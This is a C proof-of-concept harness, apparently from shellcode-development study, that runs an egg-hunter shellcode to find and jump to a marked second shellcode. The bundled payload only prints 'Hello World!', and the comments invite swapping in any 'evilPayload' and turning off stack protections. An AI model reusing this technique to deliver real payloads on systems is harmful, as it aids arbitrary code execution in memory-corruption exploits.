/* Content:	pocFile.c for egg_hunter via sigaction method -> http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf
; Author: 	Florian Hansemann | @HanseSecure | https://hansesecure.de
; Date: 	09/2017
;
;
; For testing insert extracted hexcode from egg_hunter.nasm and your favorit evilPayload & gcc -o poc poc.c -fno-stack-protector -z execstack
;
*/

#include <stdio.h>
#include <string.h>

#define EGG "\x90\x50\x90\x50"					// should be the same as in egg_hunter.nasm

unsigned char egghunter[] = \
"\x66\x81\xc9\xff\x0f\x41\x6a\x43\x58\xcd\x80\x3c\xf2\x74\xf1"
"\xb8\x90\x50\x90\x50\x89\xcf\xaf\x75\xec\xaf\x75\xe9\xff\xe7";	// extracted shellcode from egg_hunter.nasm
          		

unsigned char code[] = \
EGG								// place "EGG-Bytes" two times befor evilShellcode
EGG
"\xeb\x17\x31\xc0\xb0\x04\x31\xdb\xb3\x01\x59\x31\xd2\xb2\x0d\xcd\x80\x31\xc0\xb0\x01\x31\xdb\xcd\x80\xe8\xe4\xff\xff\xff\x48\x65\x6c\x6c\x6f\x20\x57\x6f\x72\x6c\x64\x21\x0a";			// extraced evilShellcode of your choice ;-)

int main(void) {
    printf("Shellcode length + 8 byte egg: %d\n", strlen(code));
    printf("Egg hunter length: %d\n", strlen(egghunter));
    int (*ret)() = (int(*)())egghunter;
    ret();
}
